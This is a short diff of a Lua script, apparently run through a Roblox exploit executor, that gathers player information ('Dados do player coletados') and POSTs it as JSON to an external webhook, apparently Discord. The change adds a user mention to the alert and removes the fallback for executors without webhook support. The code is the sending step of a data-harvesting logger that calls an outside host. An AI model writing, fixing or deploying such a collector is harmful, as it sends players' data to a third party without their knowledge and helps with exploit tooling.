@@ -11,7 +11,7 @@ function webhook(dados)
     end
 
     local payload = {
-        content = "📡 Dados do player coletados!",
+        content = "<@1387626772480135301> 📡 Dados do player coletados!",
         embeds = {{
             title = "🧾 Informações do Jogador",
             color = 3447003,
@@ -28,12 +28,8 @@ function webhook(dados)
         req({
             Url = url,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = { ["Content-Type"] = "application/json" },
             Body = json
         })
-    else
-        warn("❌ Exploit não suporta envio de webhook.")
     end
 end
